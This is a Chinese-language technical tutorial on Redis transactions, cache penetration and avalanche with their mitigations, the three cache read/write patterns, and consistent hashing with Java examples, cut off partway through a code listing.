<p><strong>相关 issue</strong> :<a href="https://github.com/Snailclimb/JavaGuide/issues/452">issue452: 关于 Redis 事务不满足原子性的问题</a> ，推荐阅读：<a href="https://zhuanlan.zhihu.com/p/43897838">https://zhuanlan.zhihu.com/p/43897838</a> 。</p>
<p>编译器错误（只要有语法错误，所有命令都不会执行）：在一个事务中，当命令出现错误时，后续命令正确依旧是可以添加到命令队列中去得，但是使用 EXEC 命令执行命令队列的时候，就会报错，里面一个命令都无法执行。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">MULTI</span></span><br><span class="line">OK</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">incr <span class="built_in">test</span></span></span><br><span class="line">QUEUED</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">set</span> <span class="built_in">test</span> bbbb</span></span><br><span class="line">QUEUED</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">ERR unknown command `ls`, with args beginning with: </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">exec</span></span></span><br><span class="line">(error) ERR EXEC without MULTI</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">get <span class="built_in">test</span></span></span><br><span class="line">QUEUED</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">exec</span></span></span><br><span class="line">(error) ERR EXEC without MULTI</span><br></pre></td></tr></table></figure>



<p>运行时错误（正确的都会运行，错误的那一条命令不会执行）： 这种错误不是命令错误，而是因为对命令理解不透彻出现的使用错误。例如sadd 是运行时错误。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">multi</span></span><br><span class="line">OK</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">set</span> <span class="built_in">test</span> bbb</span></span><br><span class="line">QUEUED</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">sadd <span class="built_in">test</span> ddd</span></span><br><span class="line">QUEUED</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">set</span> <span class="built_in">test</span> ccc</span></span><br><span class="line">QUEUED</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">exec</span></span></span><br><span class="line">OK</span><br><span class="line">OK</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">get <span class="built_in">test</span></span></span><br><span class="line">ccc</span><br></pre></td></tr></table></figure>

<h2 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h2><p>缓存穿透说简单点就是大量请求的 key 根本不存在于缓存中，导致请求直接到了数据库上，根本没有经过缓存这一层。例如：某个黑客故意制造缓存中不存在的 key 发起大量请求，导致大量请求落到数据库。</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>最基本的就是首先做好参数校验，一些不合法的参数请求直接抛出异常信息返回给客户端。比如查询的数据库 id 不能小于0、传入的邮箱格式不对的时候直接返回错误消息给客户端等等。</p>
<h4 id="缓存无效key"><a href="#缓存无效key" class="headerlink" title="缓存无效key"></a>缓存无效key</h4><p>如果缓存和数据库都查不到某个 key 的数据就写一个到 Redis 中去并设置过期时间，具体命令如下: <code>SET key value EX 10086</code> 。这种方式可以解决请求的 key 变化不频繁的情况，如果黑客恶意攻击，每次构建不同的请求 key，会导致Redis中缓存大量无效的 key 。很明显，这种方案并不能从根本上解决此问题。如果非要用这种方式来解决穿透问题的话，尽量将无效的 key 的过期时间设置短一点比如 1 分钟。</p>
<p> key 的设计： <code>表名:列名:主键名:主键值</code> 。</p>
<p>Java 代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObjectInclNullById</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">    <span class="comment">// 从缓存中获取数据</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">cacheValue</span> <span class="operator">=</span> cache.get(id);</span><br><span class="line">    <span class="comment">// 缓存为空</span></span><br><span class="line">    <span class="keyword">if</span> (cacheValue == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 从数据库中获取</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">storageValue</span> <span class="operator">=</span> storage.get(key);</span><br><span class="line">        <span class="comment">// 缓存空对象</span></span><br><span class="line">        cache.set(key, storageValue);</span><br><span class="line">        <span class="comment">// 如果存储数据为空，需要设置一个过期时间(300秒)</span></span><br><span class="line">        <span class="keyword">if</span> (storageValue == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 必须设置过期时间，否则有被攻击的风险</span></span><br><span class="line">            cache.expire(key, <span class="number">60</span> * <span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> storageValue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cacheValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="布隆过滤器"><a href="#布隆过滤器" class="headerlink" title="布隆过滤器"></a>布隆过滤器</h4><p><a href="https://github.com/Snailclimb/JavaGuide/blob/master/docs/dataStructures-algorithms/data-structure/bloom-filter.md">《不了解布隆过滤器？一文给你整的明明白白！》</a> </p>
<p>通过布隆过滤器可以非常方便地判断一个给定数据是否存在于海量数据中。</p>
<p>具体做法如下：把所有可能存在的请求的值都存放在布隆过滤器中，当用户请求过来，先判断用户发来的请求的值是否存在于布隆过滤器中。不存在的话，直接返回请求参数错误信息给客户端，存在的话才会走下面的流程。</p>
<p>布隆过滤器可能会存在误判的情况。总结来说就是： <strong>布隆过滤器说某个元素存在，小概率会误判。布隆过滤器说某个元素不在，那么这个元素一定不在。（false positive）</strong></p>
<p><strong>当一个元素加入布隆过滤器中的时候，会进行以下操作：</strong></p>
<ol>
<li>使用布隆过滤器中的哈希函数对元素值进行计算，得到哈希值（有几个哈希函数得到几个哈希值）。</li>
<li>根据得到的哈希值，在位数组中把对应下标的值置为 1。</li>
</ol>
<p><strong>当我们需要判断一个元素是否存在于布隆过滤器的时候，会进行以下操作：</strong></p>
<ol>
<li>对给定元素再次进行相同的哈希计算；</li>
<li>得到值之后判断位数组中的每个元素是否都为 1，如果值都为 1，那么说明这个值可能在布隆过滤器中，如果存在一个值不为 1，说明该元素不在布隆过滤器中。</li>
</ol>
<p>然后，一定会出现这种情况：<strong>不同的字符串可能哈希出来的位置相同。</strong> （可以适当增加位数组大小或者调整哈希函数来降低概率）</p>
<h2 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h2><h3 id="什么是缓存雪崩？"><a href="#什么是缓存雪崩？" class="headerlink" title="什么是缓存雪崩？"></a>什么是缓存雪崩？</h3><p><strong>缓存在同一时间大面积的失效，后面的请求都直接落到了数据库上，造成数据库短时间内承受大量请求。</strong> 这就好比雪崩一样，摧枯拉朽之势，数据库的压力可想而知，可能直接就被这么多请求弄宕机了。</p>
<p>例如：系统的缓存模块出了问题比如宕机导致不可用。造成系统的所有访问，都要走数据库。</p>
<p><strong>有一些被大量访问数据（热点缓存）在某一时刻大面积失效，导致对应的请求直接落到了数据库上。</strong> </p>
<p>例如 ：秒杀开始 12 个小时之前，统一存放了一批商品到 Redis 中，设置的缓存过期时间也是 12 个小时，那么秒杀开始的时候，这些秒杀的商品的访问直接就失效了。导致的情况就是，相应的请求直接就落到了数据库上，就像雪崩一样可怕。</p>
<h3 id="有哪些解决办法？"><a href="#有哪些解决办法？" class="headerlink" title="有哪些解决办法？"></a>有哪些解决办法？</h3><p><strong>针对 Redis 服务不可用的情况：</strong></p>
<ol>
<li>采用 Redis 集群，避免单机出现问题整个缓存服务都没办法使用。</li>
<li>限流，避免同时处理大量的请求。</li>
</ol>
<p><strong>针对热点缓存失效的情况：</strong></p>
<ol>
<li>设置不同的失效时间比如随机设置缓存的失效时间。</li>
<li>缓存永不失效。</li>
</ol>
<h2 id="3种常用的缓存读写策略"><a href="#3种常用的缓存读写策略" class="headerlink" title="3种常用的缓存读写策略"></a>3种常用的缓存读写策略</h2><h3 id="Cache-Aside-Pattern（旁路缓存模式）"><a href="#Cache-Aside-Pattern（旁路缓存模式）" class="headerlink" title="Cache Aside Pattern（旁路缓存模式）"></a>Cache Aside Pattern（旁路缓存模式）</h3><p>Cache Aside Pattern中遇到写请求是这样的：更新DB，然后直接删除 cache 。</p>
<p>如果更新数据库成功，而删除缓存这一步失败的情况的话，有两个解决方案：</p>
<ol>
<li>缓存失效时间变短（不推荐，治标不治本） ：让缓存数据的过期时间变短，这样的话缓存就会从数据库中加载数据。另外，这种解决办法对于先操作缓存后操作数据库的场景不适用。</li>
<li>增加 cache 更新重试机制（常用）： 如果cache服务当前不可用导致缓存删除失败的话，隔一段时间进行重试，重试次数可以自己定。如果多次重试还是失败的话，可以把当前更新失败的 key 存入队列中，等缓存服务可用之后，再将缓存中对应的 key 删除即可。</li>
</ol>
<p>Cache Aside Pattern 是平时使用比较多的一个缓存读写模式，比较适合读请求比较多的场景。</p>
<p>Cache Aside Pattern中服务端需要同时维系DB和 cache，并且是以 DB 的结果为准。</p>
<p>旁路缓存模式下的缓存读写步骤：</p>
<p><strong>写</strong> ：</p>
<ul>
<li>先更新DB</li>
<li>然后直接删除cache</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261425138.png" alt="img"></p>
<p><strong>读</strong> :</p>
<ul>
<li>从 cache 中读取数据，读取到就直接返回</li>
<li>cache中读取不到的话，就从 DB 中读取数据返回</li>
<li>再把数据放到 cache 中。</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261425172.png" alt="img"></p>
<h4 id="在写数据的过程中，可以先删除-cache-，后更新-DB-么？"><a href="#在写数据的过程中，可以先删除-cache-，后更新-DB-么？" class="headerlink" title="在写数据的过程中，可以先删除 cache ，后更新 DB 么？"></a>在写数据的过程中，可以先删除 cache ，后更新 DB 么？</h4><p>肯定是不行的！因为这样可能会造成<strong>数据库（DB）和缓存（Cache）数据不一致</strong>的问题。</p>
<p>例如：</p>
<p>数据A&#x3D;10。请求1写数据A&#x3D;20，先把cache中的A数据删除 -&gt; 请求2先从cache中读A，发现没有后从DB中读取数据A&#x3D;10，然后更新到cache中-&gt;请求1再把DB中的A数据更新为20。此时cache中A&#x3D;10，数据库中A&#x3D;20。</p>
<h4 id="在写数据的过程中，先更新DB，后删除cache就没有问题了么？"><a href="#在写数据的过程中，先更新DB，后删除cache就没有问题了么？" class="headerlink" title="在写数据的过程中，先更新DB，后删除cache就没有问题了么？"></a>在写数据的过程中，先更新DB，后删除cache就没有问题了么？</h4><p>理论上来说还是可能会出现数据不一致性的问题，不过概率非常小，因为缓存的写入速度是比数据库的写入速度快很多！</p>
<p>例如：</p>
<p>数据A&#x3D;10。请求1从DB读数据A&#x3D;10 -&gt;请求2写更新数据 A &#x3D; 20到数据库并删除cache中的A数据 -&gt; 请求1将数据A写入cache。此时cache中A&#x3D;10，数据库中A&#x3D;20。</p>
<h4 id="Cache-Aside-Pattern-的缺陷。"><a href="#Cache-Aside-Pattern-的缺陷。" class="headerlink" title="Cache Aside Pattern 的缺陷。"></a>Cache Aside Pattern 的缺陷。</h4><p><strong>缺陷1：首次请求数据一定不在 cache 的问题</strong></p>
<p>解决办法：可以将热点数据可以提前放入cache 中。</p>
<p><strong>缺陷2：写操作比较频繁的话导致cache中的数据会被频繁被删除，这样会影响缓存命中率 。</strong></p>
<p>解决办法：</p>
<ul>
<li>数据库和缓存数据强一致场景 ：更新DB的时候同样更新cache，不过我们需要加一个锁&#x2F;分布式锁来保证更新cache的时候不存在线程安全问题。</li>
<li>可以短暂地允许数据库和缓存数据不一致的场景 ：更新DB的时候同样更新cache，但是给缓存加一个比较短的过期时间，这样的话就可以保证即使数据不一致的话影响也比较小。</li>
</ul>
<h3 id="Read-x2F-Write-Through-Pattern（读写穿透模式）"><a href="#Read-x2F-Write-Through-Pattern（读写穿透模式）" class="headerlink" title="Read&#x2F;Write Through Pattern（读写穿透模式）"></a>Read&#x2F;Write Through Pattern（读写穿透模式）</h3><p>Read&#x2F;Write Through Pattern 中服务端把 cache 视为主要数据存储，从中读取数据并将数据写入其中。cache 服务负责将此数据读取和写入 DB，从而减轻了应用程序的职责。</p>
<p>这种缓存读写策略在平时在开发过程中非常少见。抛去性能方面的影响，大概率是因为经常使用的分布式缓存 Redis 并没有提供 cache 将数据写入DB的功能。</p>
<p><strong>写（Write Through）：</strong></p>
<ul>
<li>先查cache，cache中不存在，直接更新DB。</li>
<li>cache中存在，则先更新cache，然后 cache 服务自己更新 DB（<strong>同步更新 cache 和 DB</strong>）。</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261425273.png" alt="img"></p>
<p><strong>读(Read Through)：</strong></p>
<ul>
<li>从 cache 中读取数据，读取到就直接返回 。</li>
<li>读取不到的话，先从 DB 加载，写入到 cache 后返回响应。</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261425333.png" alt="img"></p>
<p>Read-Through Pattern 实际只是在 Cache-Aside Pattern 之上进行了封装。在 Cache-Aside Pattern 下，发生读请求的时候，如果 cache 中不存在对应的数据，是由客户端自己负责把数据写入 cache，而 Read Through Pattern 则是 cache 服务自己来写入缓存的，这对客户端是透明的。</p>
<p>和 Cache Aside Pattern 一样， Read-Through Pattern 也有首次请求数据一定不在 cache 的问题，对于热点数据可以提前放入缓存中。</p>
<h3 id="Write-Behind-Pattern（异步缓存写入）"><a href="#Write-Behind-Pattern（异步缓存写入）" class="headerlink" title="Write Behind Pattern（异步缓存写入）"></a>Write Behind Pattern（异步缓存写入）</h3><p>Write Behind Pattern 和 Read&#x2F;Write Through Pattern 很相似，两者都是由 cache 服务来负责 cache 和 DB 的读写。</p>
<p>但是，两个又有很大的不同：<strong>Read&#x2F;Write Through 是同步更新 cache 和 DB，而 Write Behind Caching 则是只更新缓存，不直接更新 DB，而是改为异步批量的方式来更新 DB。</strong></p>
<p>这种方式对数据一致性带来了更大的挑战，比如cache数据可能还没异步更新DB的话，cache服务可能就就挂掉了。</p>
<p>这种策略平时开发过程中也非常非常少见，但是不代表它的应用场景少，比如消息队列中消息的异步写入磁盘、MySQL 的 InnoDB Buffer Pool 机制都用到了这种策略。</p>
<p>Write Behind Pattern 下 DB 的写性能非常高，非常适合一些数据经常变化又对数据一致性要求没那么高的场景，比如浏览量、点赞量。</p>
<h2 id="一致性哈希算法"><a href="#一致性哈希算法" class="headerlink" title="一致性哈希算法"></a>一致性哈希算法</h2><p>当数据太大而无法存储在一个节点或机器上时，系统中需要多个这样的节点或机器来存储它。比如，使用多个 Web 缓存中间件的系统。<strong>那如何确定哪个 key 存储在哪个节点上？针对该问题，最简单的解决方案是使用哈希取模来确定。</strong> 给定一个 key，先对 key 进行哈希运算，将其除以系统中的节点数，然后将该 key 放入该节点。同样，在获取 key 时，对 key 进行哈希运算，再除以节点数，然后转到该节点并获取值。上述过程对应的哈希算法定义如下：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">node_number</span> = hash(key) % N <span class="comment"># 其中 N 为节点数。</span></span><br></pre></td></tr></table></figure>

<p>下图描绘了多节点系统中的传统的哈希取模算法，基于该算法可以实现简单的负载均衡。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242590.jpeg" alt="traditional-hashing.png"></p>
<h3 id="传统哈希取模算法的局限性"><a href="#传统哈希取模算法的局限性" class="headerlink" title="传统哈希取模算法的局限性"></a>传统哈希取模算法的局限性</h3><p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleHash</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> cap;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> seed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleHash</span><span class="params">(<span class="type">int</span> cap, <span class="type">int</span> seed)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.cap = cap;</span><br><span class="line">        <span class="built_in">this</span>.seed = seed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(String value)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> value.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            result = seed * result + value.charAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (cap - <span class="number">1</span>) &amp; result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">SimpleHash</span> <span class="variable">simpleHash</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleHash</span>(<span class="number">2</span> &lt;&lt; <span class="number">12</span>, <span class="number">8</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;node_number=hash(\&quot;semlinker\&quot;) % 3 -&gt; &quot;</span> + </span><br><span class="line">          simpleHash.hash(<span class="string">&quot;semlinker&quot;</span>) % <span class="number">3</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;node_number=hash(\&quot;kakuqo\&quot;) % 3 -&gt; &quot;</span> + </span><br><span class="line">          simpleHash.hash(<span class="string">&quot;kakuqo&quot;</span>) % <span class="number">3</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;node_number=hash(\&quot;test\&quot;) % 3 -&gt; &quot;</span> + </span><br><span class="line">          simpleHash.hash(<span class="string">&quot;test&quot;</span>) % <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上代码成功运行后，在控制台会输出以下结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node_number=hash(&quot;semlinker&quot;) % 3 -&gt; 1</span><br><span class="line">node_number=hash(&quot;kakuqo&quot;) % 3 -&gt; 2</span><br><span class="line">node_number=hash(&quot;test&quot;) % 3 -&gt; 0</span><br></pre></td></tr></table></figure>

<p>基于以上的输出结果，可以创建以下表格：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242941.jpeg" alt="ch-three-nodes-hash.jpg"></p>
<h4 id="节点减少的场景"><a href="#节点减少的场景" class="headerlink" title="节点减少的场景"></a>节点减少的场景</h4><p><strong>在分布式多节点系统中，出现故障很常见。任何节点都可能在没有任何事先通知的情况下挂掉，针对这种情况，期望系统只是出现性能降低，正常的功能不会受到影响。</strong> 假设其中 1 个节点出现故障，这时节点数发生了变化，节点个数从 3 减少为 2，此时表格的状态发生了变化：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242209.jpeg" alt="ch-two-nodes-hash.jpg"></p>
<p>很明显节点的减少会导致键与节点的映射关系发生变化，这个变化对于新的键来说并不会产生任何影响，但对于已有的键来说，将导致节点映射错误，以 “semlinker” 为例，变化前系统有 3 个节点，该键对应的节点编号为 1，当出现故障时，节点数减少为 2 个，此时该键对应的节点编号为 0。</p>
<h4 id="节点增加的场景"><a href="#节点增加的场景" class="headerlink" title="节点增加的场景"></a>节点增加的场景</h4><p><strong>在分布式多节点系统中，对于某些场景比如节日大促，就需要对服务节点进行扩容，以应对突发的流量。</strong>假设进行扩容临时增加了 1 个节点，这时节点数发生了变化，节点个数从 3 增加为 4 个，此时表格的状态发生了变化：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242508.jpeg" alt="ch-four-nodes-hash.jpg"></p>
<p>很明显节点的增加也会导致键与节点的映射关系发生变化，这个变化对于新的键来说并不会产生任何影响，但对于已有的键来说，将导致节点映射错误，同样以 “semlinker” 为例，变化前系统有 3 个节点，该键对应的节点编号为 1，当增加节点时，节点数增加为 4 个，此时该键对应的节点编号为 2。</p>
<p>当集群中节点的数量发生变化时，之前的映射规则就可能发生变化。如果集群中每个机器提供的服务没有差别，这不会有什么影响。<strong>但对于分布式缓存这种的系统而言，映射规则失效就意味着之前缓存的失效，若同一时刻出现大量的缓存失效，则可能会出现 “缓存雪崩”，这将会造成灾难性的后果。</strong></p>
<p><strong>要解决此问题，我们必须在其余节点上重新分配所有现有键，这可能是非常昂贵的操作，并且可能对正在运行的系统产生不利影响。当然除了重新分配所有现有键的方案之外，还有另一种更好的方案即使用一致性哈希算法。</strong></p>
<h3 id="一致性哈希算法-1"><a href="#一致性哈希算法-1" class="headerlink" title="一致性哈希算法"></a>一致性哈希算法</h3><p>一致性哈希算法在 1997 年由麻省理工学院提出，是一种特殊的哈希算法，在移除或者添加一个服务器时，能够尽可能小地改变已存在的服务请求与处理请求服务器之间的映射关系。一致性哈希解决了简单哈希算法在分布式<a href="https://link.segmentfault.com/?enc=RG7tKAKVADc9fpKakrdiRQ==.UcFp0gh5jKC5N/gfqMjNu53qLXwyfZK9GkwXM27y1YEAAmf/dJ7XzsPPcuI+4CKGK6p0j2c0IRQAQqUvNQBYfs+yBpIOQ8GIWTNlF5q1m2g=">哈希表</a>（Distributed Hash Table，DHT）中存在的动态伸缩等问题 。</p>
<h4 id="一致性哈希算法优点"><a href="#一致性哈希算法优点" class="headerlink" title="一致性哈希算法优点"></a>一致性哈希算法优点</h4><ul>
<li><p>可扩展性。一致性哈希算法保证了增加或减少服务器时，数据存储的改变最少，相比传统哈希算法大大节省了数据移动的开销 。</p>
</li>
<li><p>更好地适应数据的快速增长。采用一致性哈希算法分布数据，当数据不断增长时，部分虚拟节点中可能包含很多数据、造成数据在虚拟节点上分布不均衡，此时可以将包含数据多的虚拟节点分裂，这种分裂仅仅是将原有的虚拟节点一分为二、不需要对全部的数据进行重新哈希和划分。</p>
<p>虚拟节点分裂后，如果物理服务器的负载仍然不均衡，只需在服务器之间调整部分虚拟节点的存储分布。这样可以随数据的增长而动态的扩展物理服务器的数量，且代价远比传统哈希算法重新分布所有数据要小很多。</p>
</li>
</ul>
<h4 id="一致性哈希算法与哈希算法的关系"><a href="#一致性哈希算法与哈希算法的关系" class="headerlink" title="一致性哈希算法与哈希算法的关系"></a>一致性哈希算法与哈希算法的关系</h4><p>一致性哈希算法是在哈希算法基础上提出的，在动态变化的分布式环境中，哈希算法应该满足的几个条件：平衡性、单调性和分散性。</p>
<ul>
<li>平衡性：是指 hash 的结果应该平均分配到各个节点，这样从算法上解决了负载均衡问题。</li>
<li>单调性：是指在新增或者删减节点时，不影响系统正常运行。</li>
<li>分散性：是指数据应该分散地存放在分布式集群中的各个节点（节点自己可以有备份），不必每个节点都存储所有的数据。</li>
</ul>
<h3 id="一致性哈希算法原理"><a href="#一致性哈希算法原理" class="headerlink" title="一致性哈希算法原理"></a>一致性哈希算法原理</h3><p>一致性哈希算法通过一个叫作一致性哈希环的数据结构实现。这个环的起点是 0，终点是 2^32 - 1，并且起点与终点连接，故这个环的整数分布范围是 [0, 2^32-1]，如下图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242630.jpeg" alt="hash-ring.jpg"></p>
<h4 id="将对象放置到哈希环"><a href="#将对象放置到哈希环" class="headerlink" title="将对象放置到哈希环"></a>将对象放置到哈希环</h4><p>假设我们有 “semlinker”、”kakuqo”、”lolo”、”fer” 四个对象，分别简写为 o1、o2、o3 和 o4，然后使用哈希函数计算这个对象的 hash 值，值的范围是 [0, 2^32-1]：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242914.jpeg" alt="hash-ring-hash-objects.jpg"></p>
<p>图中对象的映射关系如下：</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">hash(o1) <span class="operator">=</span> k1<span class="comment">; hash(o2) = k2;</span></span><br><span class="line">hash(o3) <span class="operator">=</span> k3<span class="comment">; hash(o4) = k4;</span></span><br></pre></td></tr></table></figure>

<h4 id="将服务器放置到哈希环"><a href="#将服务器放置到哈希环" class="headerlink" title="将服务器放置到哈希环"></a>将服务器放置到哈希环</h4><p>接着使用同样的哈希函数，我们将服务器也放置到哈希环上，可以选择服务器的 IP 或主机名作为键进行哈希，这样每台服务器就能确定其在哈希环上的位置。这里假设我们有 3 台缓存服务器，分别为 cs1、cs2 和 cs3：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242225.jpeg" alt="hash-ring-hash-servers.jpg"></p>
<p>图中服务器的映射关系如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">hash</span>(cs1) = t1; <span class="built_in">hash</span>(cs2) = t2; <span class="built_in">hash</span>(cs3) = t3; <span class="comment"># Cache Server</span></span><br></pre></td></tr></table></figure>

<h4 id="为对象选择服务器"><a href="#为对象选择服务器" class="headerlink" title="为对象选择服务器"></a>为对象选择服务器</h4><p><strong>将对象和服务器都放置到同一个哈希环后，在哈希环上顺时针查找距离这个对象的 hash 值最近的机器，即是这个对象所属的机器。</strong> 以 o2 对象为例，顺序针找到最近的机器是 cs2，故服务器 cs2 会缓存 o2 对象。而服务器 cs1 则缓存 o1，o3 对象，服务器 cs3 则缓存 o4 对象。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242456.jpeg" alt="hash-ring-objects-servers.jpg"></p>
<h4 id="服务器增加的情况"><a href="#服务器增加的情况" class="headerlink" title="服务器增加的情况"></a>服务器增加的情况</h4><p>假设由于业务需要，我们需要增加一台服务器 cs4，经过同样的 hash 运算，该服务器最终落于 t1 和 t2 服务器之间，具体如下图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242695.jpeg" alt="hash-ring-add-server.jpg"></p>
<p>对于上述的情况，只有 t1 和 t2 服务器之间的对象需要重新分配。在以上示例中只有 o3 对象需要重新分配，即它被重新到 cs4 服务器。在前面我们已经分析过，如果使用简单的取模方法，当新添加服务器时可能会导致大部分缓存失效，而使用一致性哈希算法后，这种情况得到了较大的改善，因为只有少部分对象需要重新分配。</p>
<h4 id="服务器减少的情况"><a href="#服务器减少的情况" class="headerlink" title="服务器减少的情况"></a>服务器减少的情况</h4><p>假设 cs3 服务器出现故障导致服务下线，这时原本存储于 cs3 服务器的对象 o4，需要被重新分配至 cs2 服务器，其它对象仍存储在原有的机器上。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242920.jpeg" alt="hash-ring-remove-server.jpg"></p>
<h4 id="虚拟节点"><a href="#虚拟节点" class="headerlink" title="虚拟节点"></a>虚拟节点</h4><p>虚拟节点可以解决数据倾斜的问题。</p>
<p>新增的服务器 cs4 只分担了 cs1 服务器的负载，服务器 cs2 和 cs3 并没有因为 cs4 服务器的加入而减少负载压力。如果 cs4 服务器的性能与原有服务器的性能一致甚至可能更高，那么这种结果并不是所期望的。</p>
<p>为此，可以引入虚拟节点来解决负载不均衡的问题。</p>
<p>例如，假如开始时存在缓存机器c1，c2，c3，对于每个缓存机器，都有3个虚拟节点对应，其一致性hash环结构如图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282308149.png" alt="这里写图片描述"> </p>
<p>假设对于对象o1，其对应的虚拟节点为c11，而虚拟节点c11对象缓存机器c1，故对象o1被分配到机器c1中。</p>
<p>新加入缓存机器c4，其对应的虚拟节点为c41，c42，c43，将这三个虚拟节点添加到hash环中，得到的hash环结构如图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282308204.png" alt="这里写图片描述"> </p>
<p>新加入的缓存机器c4对应一组虚拟节点c41，c42，c43，加入到hash环后，影响的虚拟节点包括c31，c22，c11（顺时针查找到第一个节点），而这3个虚拟节点分别对应机器c3，c2，c1。即新加入的一台机器，同时影响到原有的3台机器。理想情况下，新加入的机器平等地分担了原有机器的负载，这正是虚拟节点带来的好处。而且新加入机器c4后，只影响25%（1&#x2F;4）对象分配，也就是说，命中率仍然有75%，这跟没有使用虚拟节点的一致性hash算法得到的结果是相同的。</p>
<h3 id="一致性哈希算法实现"><a href="#一致性哈希算法实现" class="headerlink" title="一致性哈希算法实现"></a>一致性哈希算法实现</h3><h4 id="不带虚拟节点的一致性哈希算法实现"><a href="#不带虚拟节点的一致性哈希算法实现" class="headerlink" title="不带虚拟节点的一致性哈希算法实现"></a>不带虚拟节点的一致性哈希算法实现</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.SortedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.TreeMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConsistentHashingWithoutVirtualNode</span> &#123;</span><br><span class="line">    <span class="comment">//待添加入Hash环的服务器列表</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String[] servers = &#123;<span 